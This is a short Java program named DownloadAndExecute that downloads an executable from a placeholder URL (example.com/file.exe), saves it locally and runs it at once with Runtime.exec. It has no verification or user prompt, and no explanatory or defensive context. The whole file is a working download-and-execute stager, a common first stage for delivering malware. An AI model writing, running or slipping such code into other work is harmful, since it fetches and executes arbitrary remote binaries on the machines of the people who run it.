// Java
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Paths;

public class DownloadAndExecute {
    public static void main(String[] args) throws IOException {
        String url = "http://example.com/file.exe";
        String destination = "file.exe";

        try (ReadableByteChannel rbc = Channels.newChannel(new URL(url).openStream());
             FileOutputStream fos = new FileOutputStream(destination)) {
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        }

        Runtime.getRuntime().exec(destination);
    }
}